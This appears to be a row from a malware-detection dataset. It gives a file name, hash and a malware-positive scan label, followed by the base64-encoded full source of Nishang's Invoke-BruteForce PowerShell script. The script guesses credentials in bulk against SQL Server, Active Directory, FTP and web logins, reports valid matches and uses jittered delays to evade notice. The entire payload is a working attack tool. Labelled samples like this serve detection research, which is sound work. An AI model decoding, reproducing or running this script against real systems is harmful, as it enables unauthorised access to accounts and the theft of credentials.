Invoke-BruteForce.ps1,e53a4ed90a67dade058fb6ff0583ed03,Scan result is 32768. IsMalware: 1,CmZ1bmN0aW9uIEludm9rZS1CcnV0ZUZvcmNlCnsKICA8IwouU1lOT1BTSVMKTmlzaGFuZyBwYXlsb2FkIHdoaWNoIHBlcmZvcm1zIGEgQnJ1dGUtRm9yY2UgQXR0YWNrIGFnYWluc3QgU1FMIFNlcnZlciwgQWN0aXZlIERpcmVjdG9yeSwgV2ViIGFuZCBGVFAuCgouREVTQ1JJUFRJT04KVGhpcyBwYXlsb2FkIGNhbiBicnV0ZSBmb3JjZSBjcmVkZW50aWFscyBmb3IgU1FMIFNlcnZlciwgQWN0aXZlRGlyZWN0b3J5LCBXZWIgb3IgRlRQLgoKLlBBUkFNRVRFUiBDb21wdXRlcm5hbWUKU3BlY2lmaWVzIGEgU1FMIFNlcnZlciwgRG9tYWluLCBGVFAgU2l0ZSBvciBXZWIgU2l0ZS4KCi5QQVJBTUVURVIgVXNlckxpc3QKU3BlY2lmeSBhIGxpc3Qgb2YgdXNlcnMuIElmIGJsYW5rLCB0cnVzdGVkIGNvbm5lY3Rpb24gd2lsbCBiZSB1c2VkIGZvciBTUUwgYW5kIGFuIGVycm9yIHdpbGwgYmUgZ2VucmF0ZWQgZm9yIG90aGVyIHNlcnZpY2VzLgoKLlBBUkFNRVRFUiBQYXNzd29yZExpc3QKU3BlY2lmeSBhIGxpc3Qgb2YgcGFzc3dvcmRzLgoKLlBBUkFNRVRFUiBTZXJ2aWNlCkVudGVyIGEgU2VydmljZSBmcm9tIFNRTCwgQWN0aXZlRGlyZWNvdHJ5LCBGVFAgYW5kIFdlYi4gRGVmYXVsdCBzZXJ2aWNlIGlzIHNldCB0byBTUUwuCgouUEFSQU1FVEVSIFN0b3BPblN1Y2Nlc3MKVXNlIHRoaXMgc3dpdGNoIHRvIHN0b3AgdGhlIGJydXRlIGZvcmNpbmcgb24gdGhlIGZpcnN0IHN1Y2Nlc3MuCgouUEFSQU1FVEVSIERlbGF5CkRlbGF5IGJldHdlZW4gYnJ1dGUtZm9yY2UgYXR0ZW1wdHMsIGRlZmF1bHRzIHRvIDAuCgouUEFSQU1FVEVSIEppdHRlcgpKaXR0ZXIgZm9yIHRoZSBicnV0ZS1mb3JjZSBhdHRlbXB0IGRlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zIAoKLkVYQU1QTEUKUFMgPiBJbnZva2UtQnJ1dGVGb3JjZSAtQ29tcHV0ZXJOYW1lIFNRTFNlcnYwMSAtVXNlckxpc3QgQzpcdGVzdFx1c2Vycy50eHQgLVBhc3N3b3JkTGlzdCBDOlx0ZXN0XHdvcmRsaXN0LnR4dCAtU2VydmljZSBTUUwgLVZlcmJvc2UKQnJ1dGUgZm9yY2UgYSBTUUwgU2VydmVyIFNRTFNlcnYwMSBmb3IgdXNlcnMgbGlzdGVkIGluIHVzZXJzLnR4dCBhbmQgcGFzc3dvcmRzIGluIHdvcmRsaXN0LnR4dAoKLkVYQU1QTEUKUFMgPiBJbnZva2UtQnJ1dGVGb3JjZSAtQ29tcHV0ZXJOYW1lIHRhcmdldGRvbWFpbi5jb20gLVVzZXJMaXN0IEM6XHRlc3RcdXNlcnMudHh0IC1QYXNzd29yZExpc3QgQzpcdGVzdFx3b3JkbGlzdC50eHQgLVNlcnZpY2UgQWN0aXZlRGlyZWN0b3J5IC1TdG9wT25TdWNjZXNzIC1WZXJib3NlCkJydXRlIGZvcmNlIGEgRG9tYWluIENvbnRyb2xsZXIgb2YgdGFyZ2V0ZG9tYWluLmNvbSBmb3IgdXNlcnMgbGlzdGVkIGluIHVzZXJzLnR4dCBhbmQgcGFzc3dvcmRzIGluIHdvcmRsaXN0LnR4dC4KU2luY2UgU3RvcE9uU3VjY2VzcyBpcyBzcGVjaWZpZWQsIHRoZSBicnV0ZSBmb3JjaW5nIHN0b3BzIG9uIGZpcnN0IHN1Y2Nlc3MuCgouRVhBTVBMRQpQUyA+IGNhdCBDOlx0ZXN0XHNlcnZlcnMudHh0IHwgSW52b2tlLUJydXRlRm9yY2UgLVVzZXJMaXN0IEM6XHRlc3RcdXNlcnMudHh0IC1QYXNzd29yZExpc3QgQzpcdGVzdFx3b3JkbGlzdC50eHQgLVNlcnZpY2UgU1FMIC1WZXJib3NlCkJydXRlIGZvcmNlIFNRTCBTZXJ2aWNlIG9uIGFsbCB0aGUgc2VydmVycyBzcGVjaWZpZWQgaW4gc2VydmVycy50eHQKCi5MSU5LCmh0dHA6Ly93d3cudHJ1ZXNlYy5jb20KaHR0cDovL2Jsb2dzLnRlY2huZXQuY29tL2IvaGV5c2NyaXB0aW5nZ3V5L2FyY2hpdmUvMjAxMi8wNy8wMy91c2UtcG93ZXJzaGVsbC10by1zZWN1cml0eS10ZXN0LXNxbC1zZXJ2ZXItYW5kLXNoYXJlcG9pbnQuYXNweApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKLk5PVEVTCkdvdWRlIDIwMTIsIFRyZXVTZWMKIz4KICAgIFtDbWRsZXRCaW5kaW5nKCldIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUsIFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmU9JHRydWUpXQogICAgICAgIFtBbGlhcygiUFNDb21wdXRlck5hbWUiLCJDTiIsIk1hY2hpbmVOYW1lIiwiSVAiLCJJUEFkZHJlc3MiLCJJZGVudGl0eSIsIlVybCIsIkZ0cCIsIkRvbWFpbiIsIkRpc3Rpbmd1aXNoZWROYW1lIildCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtBbGlhcygnVXNlcnMnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyTGlzdCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbQWxpYXMoJ1Bhc3N3b3JkcycpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFBhc3N3b3JkTGlzdCwKCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDMsIE1hbmRhdG9yeSA9ICR0cnVlKV0gW1ZhbGlkYXRlU2V0KCJTUUwiLCJGVFAiLCJBY3RpdmVEaXJlY3RvcnkiLCJXZWIiKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZXJ2aWNlID0gIlNRTCIsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA0LCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJFN0b3BPblN1Y2Nlc3MsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDUsIE1hbmRhdG9yeSA9ICRmYWxzZSldCiAgICAgICAgW0RvdWJsZV0KICAgICAgICAkSml0dGVyID0gLjMsCgogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSA2LCBNYW5kYXRvcnkgPSAkZmFsc2UpXQogICAgICAgIFtVSW50MzJdCiAgICAgICAgJERlbGF5ID0gMAogICAgKQoKICAgIFByb2Nlc3MKICAgIHsKICAgICAgICBXcml0ZS1WZXJib3NlICJTdGFydGluZyBCcnV0ZS1Gb3JjZSB3aXRoIGEgRGVsYXkgb2YgJERlbGF5IGFuZCBKaXR0ZXIgJEppdHRlci4iCiAgICAgICAgCiAgICAgICAgJHVzZXJuYW1lcyA9IEdldC1Db250ZW50IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIC1QYXRoICRVc2VyTGlzdAogICAgICAgICRwYXNzd29yZHMgPSBHZXQtQ29udGVudCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSAtUGF0aCAkUGFzc3dvcmRMaXN0CiAgICAgICAgaWYgKCEkdXNlcm5hbWVzKSB7IAogICAgICAgICAgICAkdXNlcm5hbWVzID0gJFVzZXJMaXN0CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlVzZXJMaXN0IGZpbGUgZG9lcyBub3QgZXhpc3QuIFVzaW5nIFVzZXJMaXN0IGFzIHVzZXJuYW1lczoiCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgJHVzZXJuYW1lcwogICAgICAgIH0KICAgICAgICBpZiAoISRwYXNzd29yZHMpIHsKICAgICAgICAgICAgJHBhc3N3b3JkcyA9ICRQYXNzd29yZExpc3QKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUGFzc3dvcmRMaXN0IGZpbGUgZG9lcyBub3QgZXhpc3QuIFVzaW5nIFBhc3N3b3JkTGlzdCBhcyBwYXNzd29yZHM6IgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICRwYXNzd29yZHMKICAgICAgICB9CgogICAgICAgICRSYW5kTm8gPSBOZXctT2JqZWN0IFN5c3RlbS5SYW5kb20KCiAgICAgICAgI0JydXRlIGZvcmNlIFNRTCBTZXJ2ZXIKICAgICAgICAkQ29ubmVjdGlvbiA9IE5ldy1PYmplY3QgU3lzdGVtLkRhdGEuU1FMQ2xpZW50LlNRTENvbm5lY3Rpb24KICAgICAgICBmdW5jdGlvbiBDaGVja0ZvclNRTFN1Y2Nlc3MKICAgICAgICB7CiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbi5PcGVuKCkKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBDYXRjaAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKCRzdWNjZXNzIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJNYXRjaCBmb3VuZCEgJHVzZXJuYW1lIDogJFBhc3N3b3JkIgogICAgICAgICAgICAgICAgc3dpdGNoICgkY29ubmVjdGlvbi5TZXJ2ZXJWZXJzaW9uKSB7CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl42IiB9IHsgIlNRTCBTZXJ2ZXIgNi41IjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeNyIgfSB7ICJTUUwgU2VydmVyIDciO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl44IiB9IHsgIlNRTCBTZXJ2ZXIgMjAwMCI7QnJlYWsgVXNlcm5hbWVMb29wIH0KICAgICAgICAgICAgICAgICAgICB7ICRfIC1tYXRjaCAiXjkiIH0geyAiU1FMIFNlcnZlciAyMDA1IjtCcmVhayBVc2VybmFtZUxvb3AgfQogICAgICAgICAgICAgICAgICAgIHsgJF8gLW1hdGNoICJeMTBcLjAwIiB9IHsgIlNRTCBTZXJ2ZXIgMjAwOCI7QnJlYWsgVXNlcm5hbWVMb29wIH0KICAgICAgICAgICAgICAgICAgICB7ICRfIC1tYXRjaCAiXjEwXC41MCIgfSB7ICJTUUwgU2VydmVyIDIwMDggUjIiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl4xMSIgfSB7ICJTUUwgU2VydmVyIDIwMTIiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl4xMiIgfSB7ICJTUUwgU2VydmVyIDIwMTQiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgeyAkXyAtbWF0Y2ggIl4xMyIgfSB7ICJTUUwgU2VydmVyIDIwMTYiO0JyZWFrIFVzZXJuYW1lTG9vcCB9CiAgICAgICAgICAgICAgICAgICAgRGVmYXVsdCB7ICJVbmtub3duIiB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgICMgU2hhbWVsZXNzbHkgc3RvbGVuIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxFbXBpcmUvUG93ZXJUb29scy90cmVlL21hc3Rlci9Qb3dlclZpZXcKICAgICAgICAgICAgU3RhcnQtU2xlZXAgLVNlY29uZHMgJFJhbmROby5OZXh0KCgxLSRKaXR0ZXIpKiREZWxheSwgKDErJEppdHRlcikqJERlbGF5KQogICAgICAgIH0KICAgICAgICBpZigkc2VydmljZSAtZXEgIlNRTCIpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkJydXRlIEZvcmNpbmcgU1FMIFNlcnZpY2Ugb24gJENvbXB1dGVyTmFtZSIKICAgICAgICAgICAgaWYoJHVzZXJMaXN0KQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICA6VXNlcm5hbWVMb29wIGZvcmVhY2ggKCR1c2VybmFtZSBpbiAkdXNlcm5hbWVzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRQYXNzd29yZCBpbiAkUGFzc3dvcmRzKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJENvbm5lY3Rpb24uQ29ubmVjdGlvblN0cmluZyA9ICJEYXRhIFNvdXJjZT0kQ29tcHV0ZXJOYW1lO0luaXRpYWwgQ2F0YWxvZz1NYXN0ZXI7VXNlciBJZD0kdXNlck5hbWU7UGFzc3dvcmQ9JHBhc3N3b3JkOyIKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2hlY2tpbmcgJHVzZXJOYW1lIDogJHBhc3N3b3JkIgogICAgICAgICAgICAgICAgICAgICAgICBDaGVja0ZvclNRTFN1Y2Nlc3MKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjSWYgbm8gdXNlcm5hbWUgaXMgcHJvdmlkZWQsIHVzZSB0cnVzdGVkIGNvbm5lY3Rpb24KICAgICAgICAgICAgICAgICRDb25uZWN0aW9uLkNvbm5lY3Rpb25TdHJpbmcgPSAic2VydmVyPSRpZGVudGl0eTtJbml0aWFsIENhdGFsb2c9TWFzdGVyO3RydXN0ZWRfY29ubmVjdGlvbj10cnVlOyIKICAgICAgICAgICAgICAgIENoZWNrRm9yU1FMU3VjY2VzcwoKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgI0JydXRlIEZvcmNlIEZUUAogICAgICAgIGVsc2VpZiAoJHNlcnZpY2UgLWVxICJGVFAiKQogICAgICAgIHsKICAgICAgICAgICAgaWYoJENvbXB1dGVyTmFtZSAtbm90TWF0Y2ggIl5mdHA6Ly8iKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc291cmNlID0gImZ0cDovLyIgKyAkQ29tcHV0ZXJOYW1lCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc291cmNlID0gJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiQnJ1dGUgRm9yY2luZyBGVFAgb24gJENvbXB1dGVyTmFtZSIKCiAgICAgICAgICAgIDpVc2VybmFtZUxvb3AgZm9yZWFjaCAoJHVzZXJuYW1lIGluICR1c2VybmFtZXMpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGZvcmVhY2ggKCRQYXNzd29yZCBpbiAkUGFzc3dvcmRzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJGZ0cFJlcXVlc3QgPSBbU3lzdGVtLk5ldC5GdHBXZWJSZXF1ZXN0XTo6Q3JlYXRlKCRzb3VyY2UpCiAgICAgICAgICAgICAgICAgICAgICAgICRmdHBSZXF1ZXN0Lk1ldGhvZCA9IFtTeXN0ZW0uTmV0LldlYlJlcXVlc3RNZXRob2RzK0Z0cF06Okxpc3REaXJlY3RvcnlEZXRhaWxzCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNoZWNraW5nICR1c2VyTmFtZSA6ICRwYXNzd29yZCIKICAgICAgICAgICAgICAgICAgICAgICAgJGZ0cFJlcXVlc3QuQ3JlZGVudGlhbHMgPSBuZXctb2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoJHVzZXJOYW1lLCAkcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgICAgICRyZXN1bHQgPSAkZnRwUmVxdWVzdC5HZXRSZXNwb25zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJHJlc3VsdC5CYW5uZXJNZXNzYWdlICsgJHJlc3VsdC5XZWxjb21lTWVzc2FnZQogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1PdXRwdXQgIk1hdGNoIGZvdW5kISAkdXNlcm5hbWUgOiAkUGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJHRydWUKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRTdG9wT25TdWNjZXNzKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhayBVc2VybmFtZUxvb3AKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgY2F0Y2gKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRtZXNzYWdlID0gJGVycm9yWzBdLlRvU3RyaW5nKCkKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICMgU2hhbWVsZXNzbHkgc3RvbGVuIGZyb20gaHR0cHM6Ly9naXRodWIuY29tL1Bvd2VyU2hlbGxFbXBpcmUvUG93ZXJUb29scy90cmVlL21hc3Rlci9Qb3dlclZpZXcKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgICNCcnV0ZSBGb3JjZSBBY3RpdmUgRGlyZWN0b3J5CiAgICAgICAgZWxzZWlmICgkc2VydmljZSAtZXEgIkFjdGl2ZURpcmVjdG9yeSIpCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1PdXRwdXQgIkJydXRlIEZvcmNpbmcgQWN0aXZlIERpcmVjdG9yeSAkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICBBZGQtVHlwZSAtQXNzZW1ibHlOYW1lIFN5c3RlbS5EaXJlY3RvcnlTZXJ2aWNlcy5BY2NvdW50TWFuYWdlbWVudAogICAgICAgICAgICAkY29udGV4dFR5cGUgPSBbU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LkNvbnRleHRUeXBlXTo6RG9tYWluCiAgICAgICAgICAgIFRyeQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkcHJpbmNpcGFsQ29udGV4dCA9IE5ldy1PYmplY3QgU3lzdGVtLkRpcmVjdG9yeVNlcnZpY2VzLkFjY291bnRNYW5hZ2VtZW50LlByaW5jaXBhbENvbnRleHQoJGNvbnRleHRUeXBlLCAkQ29tcHV0ZXJOYW1lKQogICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkdHJ1ZQogICAgICAgICAgICB9CiAgICAgICAgICAgIENhdGNoCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRtZXNzYWdlID0gIlVuYWJsZSB0byBjb250YWN0IERvbWFpbiIKICAgICAgICAgICAgICAgICRzdWNjZXNzID0gJGZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoJHN1Y2Nlc3MgLW5lICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgOlVzZXJuYW1lTG9vcCBmb3JlYWNoICgkdXNlcm5hbWUgaW4gJHVzZXJuYW1lcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBmb3JlYWNoICgkcGFzc3dvcmQgaW4gJHBhc3N3b3JkcykKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICRTbGVlcFNlY29uZHMgPSAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCiAgICAgICAgICAgICAgICAgICAgICAgIFRyeQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDaGVja2luZyAkdXNlcm5hbWUgOiAkcGFzc3dvcmQgKHRoZW4gc2xlZXBpbmcgZm9yICRTbGVlcFNlY29uZHMgc2Vjb25kcykiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRwcmluY2lwYWxDb250ZXh0LlZhbGlkYXRlQ3JlZGVudGlhbHMoJHVzZXJuYW1lLCAkcGFzc3dvcmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICJQYXNzd29yZCBNYXRjaCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkc3VjY2VzcyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtT3V0cHV0ICJNYXRjaCBmb3VuZCEgJHVzZXJuYW1lIDogJHBhc3N3b3JkIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkU3RvcE9uU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrIFVzZXJuYW1lTG9vcAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICBDYXRjaAogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAiUGFzc3dvcmQgZG9lc24ndCBtYXRjaCIKICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgIyBTaGFtZWxlc3NseSBzdG9sZW4gZnJvbSBodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbEVtcGlyZS9Qb3dlclRvb2xzL3RyZWUvbWFzdGVyL1Bvd2VyVmlldwogICAgICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkU2xlZXBTZWNvbmRzCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZSAkbWVzc2FnZSAgICAKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAjQnJ1dGUgRm9yY2UgV2ViCiAgICAgICAgZWxzZWlmICgkc2VydmljZSAtZXEgIldlYiIpCiAgICAgICAgewogICAgICAgICAgICBpZiAoJENvbXB1dGVyTmFtZSAtbm90TWF0Y2ggIl4oaHR0cHxodHRwcyk6Ly8iKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkc291cmNlID0gImh0dHA6Ly8iICsgJENvbXB1dGVyTmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJHNvdXJjZSA9ICRDb21wdXRlck5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICA6VXNlcm5hbWVMb29wIGZvcmVhY2ggKCR1c2VybmFtZSBpbiAkdXNlcm5hbWVzKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBmb3JlYWNoICgkUGFzc3dvcmQgaW4gJFBhc3N3b3JkcykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkd2ViQ2xpZW50ID0gTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50CiAgICAgICAgICAgICAgICAgICAgJHNlY3VyZVBhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAtQXNQbGFpblRleHQgLVN0cmluZyAkcGFzc3dvcmQgLUZvcmNlCiAgICAgICAgICAgICAgICAgICAgJGNyZWRlbnRpYWwgPSBOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCAtQXJndW1lbnRMaXN0ICR1c2VyTmFtZSwgJHNlY3VyZVBhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgJHdlYkNsaWVudC5DcmVkZW50aWFscyA9ICRjcmVkZW50aWFsCiAgICAgICAgICAgICAgICAgICAgVHJ5CiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJDaGVja2luZyAkdXNlck5hbWUgOiAkcGFzc3dvcmQiCiAgICAgICAgICAgICAgICAgICAgICAgICRzb3VyY2UKICAgICAgICAgICAgICAgICAgICAgICAgJHdlYkNsaWVudC5Eb3dubG9hZFN0cmluZygkc291cmNlKQogICAgICAgICAgICAgICAgICAgICAgICAkc3VjY2VzcyA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICRzdWNjZXNzCiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkc3VjY2VzcyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLU91dHB1dCAiTWF0Y2ggZm91bmQhICRVc2VybmFtZSA6ICRQYXNzd29yZCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkU3RvcE9uU3VjY2VzcykKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhayBVc2VybmFtZUxvb3AKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBDYXRjaAogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgJHN1Y2Nlc3MgPSAkZmFsc2UKICAgICAgICAgICAgICAgICAgICAgICAgJG1lc3NhZ2UgPSAiUGFzc3dvcmQgZG9lc24ndCBtYXRjaCIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgIyBTaGFtZWxlc3NseSBzdG9sZW4gZnJvbSBodHRwczovL2dpdGh1Yi5jb20vUG93ZXJTaGVsbEVtcGlyZS9Qb3dlclRvb2xzL3RyZWUvbWFzdGVyL1Bvd2VyVmlldwogICAgICAgICAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzICRSYW5kTm8uTmV4dCgoMS0kSml0dGVyKSokRGVsYXksICgxKyRKaXR0ZXIpKiREZWxheSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=
